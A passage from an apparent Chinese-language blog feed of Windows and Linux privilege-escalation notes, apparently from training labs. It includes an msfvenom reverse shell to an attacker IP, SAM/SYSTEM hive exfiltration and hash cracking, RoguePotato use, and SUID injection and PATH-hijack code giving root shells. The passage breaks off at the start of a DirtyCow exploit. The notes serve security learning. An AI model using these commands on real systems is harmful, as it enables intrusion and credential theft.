class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 在注册表中查询 AlwaysInstallElevated 键：</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"># 请注意，两个键都设置为 <span class="number">1</span> (<span class="number">0</span>x1)。</span><br><span class="line"></span><br><span class="line">#在Kali上，使用msfvenom生成反向shell Windows Installer (reverse.msi)。更新LHOST IP地址：</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">10</span>.<span class="number">11</span>.<span class="number">53</span>.<span class="number">68</span> LPORT=<span class="number">53</span> -f msi -o reverse.msi</span><br><span class="line"></span><br><span class="line"># 将 reverse.msi 文件传输到 Windows 上的 C:\PrivEsc 目录（使用之前的 SMB 服务器方法）。</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">10</span>.<span class="number">11</span>.<span class="number">53</span>.<span class="number">68</span>\share\reverse.msi c:\PrivEsc\reverse.msi</span><br><span class="line"></span><br><span class="line">#在 Kali 上启动一个监听器，然后运行安装程序以触发以 SYSTEM 权限运行的反向 shell：</span><br><span class="line">msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/1271cee0aab41beea675ef6944e20854.png" alt="image-20220525220104009"></p><h3 id="4-密码"><a href="#4-密码" class="headerlink" title="#4 密码"></a>#4 密码</h3><p>) 1 - 注册表</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/37751d916149b6850e2175cb41a49ccd.png" alt="image-20220525224435116"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以在注册表中搜索包含password一词的键和值：</span></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果您想节省一些时间，请查询此特定密钥以查找管理员 AutoLogon 凭据：</span></span><br><span class="line">reg query <span class="string">&quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span></span><br></pre></td></tr></table></figure><p>) 2 - 保存的凭据</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/ba4a9b1e8a0531ef4126f7a4a82384f5.png" alt="image-20220526095216760"></p><p>如果winPEASany没用出结果需要手动输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有保存的凭据：</span></span><br><span class="line">cmdkey /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Kali 上启动一个侦听器并使用 runas 和管理员用户保存的凭据运行 reverse.exe 可执行文件：</span></span><br><span class="line">runas /savecred /user:admin C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/d9bce80d8228f9b81143e689edf77e1c.png" alt="image-20220525224203673"></p><p>) 3 - 安全帐户管理器 (SAM)</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/20932fa6cdcd4377abf093d39200189b.png" alt="image-20220526095641426"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将 SAM 和 SYSTEM 文件传输到您的 Kali VM：</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\Repair\SAM \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\kali\</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\Repair\SYSTEM \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\kali\</span><br><span class="line"></span><br><span class="line"># 在 Kali 上，克隆 creddump7 存储库（Kali 上的存储库已过时，无法正确转储 Windows <span class="number">10</span> 的哈希值！）并使用它从 SAM 和 SYSTEM 文件中转储哈希值：</span><br><span class="line">git clone https://github.com/Tib3rius/creddump7</span><br><span class="line">pip3 install pycrypto</span><br><span class="line">python3 creddump7/pwdump.py SYSTEM SAM</span><br><span class="line"></span><br><span class="line"># 使用 hashcat 破解管理员 NTLM 哈希：</span><br><span class="line">hashcat -m <span class="number">1000</span> --force &lt;hash&gt; /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/c92ecf92f8e5569c5323adabf5809a9b.png" alt="image-20220526102104852"></p><h3 id="5-计划任务"><a href="#5-计划任务" class="headerlink" title="#5 计划任务"></a>#5 计划任务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v# 任务列表</span><br><span class="line">schtasks /query /fo LIST /v | <span class="built_in">find</span> &quot;Task To Run&quot;# 过滤运行的任务文件</span><br><span class="line"></span><br><span class="line">#查看 C:\DevTools\CleanUp.ps1 脚本的内容：</span><br><span class="line"><span class="built_in">type</span> C:\DevTools\CleanUp.ps1</span><br><span class="line"></span><br><span class="line">#该脚本似乎每分钟都以 SYSTEM 身份运行。使用 accesschk.exe，请注意您可以写入此文件：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">quvw</span> <span class="title">user</span> <span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在 <span class="title">Kali</span> 上启动一个侦听器，然后将一行添加到<span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span> 运行您创建的 <span class="title">reverse.exe</span> 可执行文件：</span></span><br><span class="line"><span class="function"><span class="title">echo</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &gt;&gt; <span class="title">C</span>:\<span class="title">DevTools</span>\<span class="title">CleanUp.ps1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 等待计划任务运行，这将触发反向 <span class="title">shell</span> 作为 <span class="title">SYSTEM</span>。</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9989b9141ca55268a1eeeb1a412859e2.png" alt="image-20220526133707718"></p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/dc24843955a002b9ad56bb9a70315600.png" alt="image-20220526135208329"></p><h3 id="6-不安全的-GUI-应用程序"><a href="#6-不安全的-GUI-应用程序" class="headerlink" title="#6 不安全的 GUI 应用程序"></a>#6 不安全的 GUI 应用程序</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 桌面上有个画图程序，运行程序后输入</span><br><span class="line">tasklist /V | <span class="built_in">findstr</span> mspaint.exe</span><br><span class="line"></span><br><span class="line"># 双击桌面上的“AdminPaint”快捷方式。运行后，打开命令提示符并注意 Paint 正在以管理员权限运行：</span><br><span class="line">tasklist /V | <span class="built_in">findstr</span> mspaint.exe</span><br><span class="line"></span><br><span class="line"># 在画图中，单击“文件”，然后单击“打开”。在打开文件对话框中，点击导航输入并粘贴：</span><br><span class="line"><span class="function">file://<span class="title">c</span>:/<span class="title">windows</span>/<span class="title">system32</span>/<span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 按 <span class="title">Enter</span> 以生成以管理员权限运行的命令提示符。</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/2a64c0e29ab5bb88586dc010724b0951.png" alt="image-20220526142759387"></p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/a39d6cd030126322c919f8468309d5b4.png" alt="image-20220526142549020"></p><h3 id="7-Startup-应用程序"><a href="#7-Startup-应用程序" class="headerlink" title="#7 Startup 应用程序"></a>#7 Startup 应用程序</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/c6518526f2446bd09afb7591efc300df.png" alt="image-20220526143354340"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用 accesschk.exe，注意 BUILTIN\Users 组可以将文件写入 StartUp 目录：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">d</span> &quot;<span class="title">C</span>:\<span class="title">ProgramData</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Start</span> <span class="title">Menu</span>\<span class="title">Programs</span>\<span class="title">StartUp</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#使用 <span class="title">cscript</span>，运行 <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">CreateShortcut.vbs</span> 脚本，该脚本应该在 <span class="title">StartUp</span> 目录中为您的 <span class="title">reverse.exe</span> 可执行文件创建一个新的快捷方式：</span></span><br><span class="line"><span class="function"><span class="title">cscript</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">CreateShortcut.vbs</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在 <span class="title">Kali</span> 上启动一个监听器，然后等待管理员登录：</span></span><br><span class="line"><span class="function"># 以管理员身份运行的 <span class="title">shell</span> 应连接回您的侦听器。</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/76b70937c6087bacf08298ad02874238.png" alt="image-20220526143837667"></p><h3 id="8-令牌模拟"><a href="#8-令牌模拟" class="headerlink" title="#8 令牌模拟"></a>#8 令牌模拟</h3><p>) 1 - Rogue Potato(流氓土豆)</p><p>参考文章 : <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato</a></p><p>利用详情 : <a href="https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html">https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html</a></p><p>Tools : <a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p><ul><li>本地服务权限账户</li><li>启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege </li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 在您的机器上运行socat重定向（替换VICTIM_IP）：</span><br><span class="line">socat tcp-listen:<span class="number">135</span>,reuseaddr,fork tcp:VICTIM_IP:<span class="number">9999</span></span><br><span class="line">sudo socat tcp-listen:<span class="number">135</span>,reuseaddr,fork tcp:<span class="number">10</span>.<span class="number">10</span>.<span class="number">79</span>.<span class="number">228</span>:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line"># 执行 PoC（替换YOUR_IP和command）：</span><br><span class="line">.\RoguePotato.exe -r YOUR_IP -e &quot;command&quot; -l <span class="number">9999</span></span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">RoguePotato.exe</span> -<span class="title">r</span> 10.11.53.68 -<span class="title">e</span> &quot;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span>&quot; -<span class="title">l</span> 9999</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/d5a9584af9cce73c8a057da880b93a74.png" alt="image-20220527103837310"></p><p>) 2 - PrintSpoofer</p><p>漏洞详细 ： <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a></p><p>Tools : <a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p><ul><li>需要本地服务或网络服务访问</li><li>启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</li></ul><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/e9690c18d01909d08110e64e6fd33273.png" alt="image-20220527144905068"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0-信息收集&quot;&gt;&lt;a href=&quot;#0-信息收集&quot; class=&quot;headerlink&quot; title=&quot;#0 信息收集&quot;&gt;&lt;/a&gt;#0 信息收集&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    
    <category term="提权" scheme="https://z4ynadmin.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux Privesc</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/Linux-Privesc/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/Linux-Privesc/</id>
    <published>2022-11-07T07:27:25.000Z</published>
    <updated>2022-11-07T07:34:12.635Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-枚举脚本"><a href="#0-枚举脚本" class="headerlink" title="#0 枚举脚本"></a>#0 枚举脚本</h3><p><strong>linpeas.sh：</strong><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p><strong>LinEnum：</strong><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p><p><strong>lse.sh：</strong><a href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh">https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh</a></p><hr><h3 id="1-滥用-SUID-GUID-文件"><a href="#1-滥用-SUID-GUID-文件" class="headerlink" title="#1 滥用 SUID/GUID 文件"></a>#1 滥用 SUID/GUID 文件</h3><ul><li>查疑似漏洞</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">$ find / -perm -4000  2&gt;/dev/null</span><br><span class="line">$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure><ul><li>exim提权</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">......</span><br><span class="line">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3<span class="comment">#exim 可以提权</span></span><br><span class="line">......</span><br><span class="line">$ searchsploit -m 39535</span><br></pre></td></tr></table></figure><ul><li>SUID-共享对象注入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">......</span><br><span class="line">-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/<span class="built_in">local</span>/bin/suid-so<span class="comment">#可执行文件容易受到共享对象注入的影响</span></span><br><span class="line">......</span><br><span class="line">user@debian:~$ strace /usr/<span class="built_in">local</span>/bin/suid-so 2&gt;&amp;1 | grep -iE <span class="string">&quot;open|access|no such file&quot;</span>    <span class="comment">#对文件运行strace并在输出中搜索打开/访问调用和“没有这样的文件”错误</span></span><br><span class="line">access(<span class="string">&quot;/etc/suid-debug&quot;</span>, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY)      = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/lib/libdl.so.2&quot;</span>, O_RDONLY)       = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/usr/lib/libstdc++.so.6&quot;</span>, O_RDONLY) = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/lib/libm.so.6&quot;</span>, O_RDONLY)        = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/lib/libgcc_s.so.1&quot;</span>, O_RDONLY)    = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/lib/libc.so.6&quot;</span>, O_RDONLY)        = 3</span><br><span class="line">open(<span class="string">&quot;/home/user/.config/libcalc.so&quot;</span>, O_RDONLY) = -1 ENOENT (No such file or directory)<span class="comment">#请注意，可执行文件尝试在我们的主目录中加载/home/user/.config/libcalc.so共享对象，但找不到它</span></span><br><span class="line"></span><br><span class="line">user@debian:~$ cat /home/user/tools/suid/libcalc.c<span class="comment">#libcalc.c 源码</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">inject</span></span>() &#123;</span><br><span class="line">setuid(0);</span><br><span class="line">system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ mkdir /home/user/.config<span class="comment">#为 libcalc.so 文件创建.config目录</span></span><br><span class="line">$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c<span class="comment">#将代码编译到suid-so可执行文件所在位置的共享对象中</span></span><br><span class="line">$ /usr/<span class="built_in">local</span>/bin/suid-so<span class="comment">#执行suid-so可执行文件</span></span><br><span class="line">Calculating something, please <span class="built_in">wait</span>...</span><br><span class="line">bash-4.1<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>SUID-环境变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/local/bin/suid-env可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序</span></span><br><span class="line">user@debian:~$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">......</span><br><span class="line">-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/<span class="built_in">local</span>/bin/suid-env</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">user@debian:~$ /usr/<span class="built_in">local</span>/bin/suid-env<span class="comment">#执行该文件并注意它似乎正在尝试启动apache2网络服务器</span></span><br><span class="line">[....] Starting web server: apache2httpd (pid 1623) already running</span><br><span class="line">. ok </span><br><span class="line"></span><br><span class="line">user@debian:~$ strings /usr/<span class="built_in">local</span>/bin/suid-env<span class="comment">#strings在文件上运行字符串以查找可打印字符的字符串</span></span><br><span class="line">.....</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line">l$ L</span><br><span class="line">t$(L</span><br><span class="line">|<span class="variable">$0H</span></span><br><span class="line">service apache2 start<span class="comment">#一行（“service apache2 start”）表明正在调用服务可执行文件来启动网络服务器，但未使用可执行文件的完整路径（/usr/sbin/service）。</span></span><br><span class="line"></span><br><span class="line">user@debian:~$ cat /home/user/tools/suid/service.c<span class="comment">#service.c源码</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">setuid(0);</span><br><span class="line">system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">user@debian:~$ gcc -o service /home/user/tools/suid/service.c<span class="comment">#编译</span></span><br><span class="line">user@debian:~$ PATH=.:<span class="variable">$PATH</span> /usr/<span class="built_in">local</span>/bin/suid-env<span class="comment">#将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量中，然后运行suid-env可执行文件以获得 root shell</span></span><br><span class="line">root@debian:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br></pre></td></tr></table></figure><ul><li>SUID-滥用Shell功能</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/local/bin/suid-env2 可执行文件与 /usr/local/bin/suid-env 相同，只是它使用服务可执行文件 (/usr/sbin/service) 的绝对路径来启动 apache2 网络服务器。</span></span><br><span class="line">user@debian:~$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">......</span><br><span class="line">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/<span class="built_in">local</span>/bin/suid-env2</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">user@debian:~$ strings /usr/<span class="built_in">local</span>/bin/suid-env2<span class="comment">#strings在文件上运行字符串以查找可打印字符的字符串</span></span><br><span class="line">......</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line">l$ L</span><br><span class="line">t$(L</span><br><span class="line">|<span class="variable">$0H</span></span><br><span class="line">/usr/sbin/service apache2 start<span class="comment">#可执行文件 (/usr/sbin/service) 的绝对路径来启动 apache2 网络服务器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在Bash版本&lt;4.2-048，可以定义名称类似于文件路径的 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。</span></span><br><span class="line">user@debian:~$ /bin/bash --version<span class="comment">#查看Bash版本</span></span><br><span class="line">GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)</span><br><span class="line">Copyright (C) 2009 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line"></span><br><span class="line">This is free software; you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个名为“ /usr/sbin/service ”的 Bash 函数，该函数执行一个新的 Bash shell（使用 -p 以保留权限）并导出该函数</span></span><br><span class="line">user@debian:~$ <span class="keyword">function</span> /usr/sbin/service &#123; /bin/bash -p; &#125; </span><br><span class="line">user@debian:~$ <span class="built_in">export</span> -f /usr/sbin/service</span><br><span class="line">user@debian:~$ /usr/<span class="built_in">local</span>/bin/suid-env2<span class="comment">#运行suid-env2可执行文件以获取 root shell</span></span><br><span class="line">root@debian:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="2-sudo提权"><a href="#2-sudo提权" class="headerlink" title="#2 sudo提权"></a>#2 sudo提权</h3><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><hr><h3 id="3-内核提权"><a href="#3-内核提权" class="headerlink" title="#3 内核提权"></a>#3 内核提权</h3><p><strong>枚举脚本：</strong></p><p><a href="https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh">https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl">https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl</a></p><ul><li>dirctycow(脏牛提权 exp)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 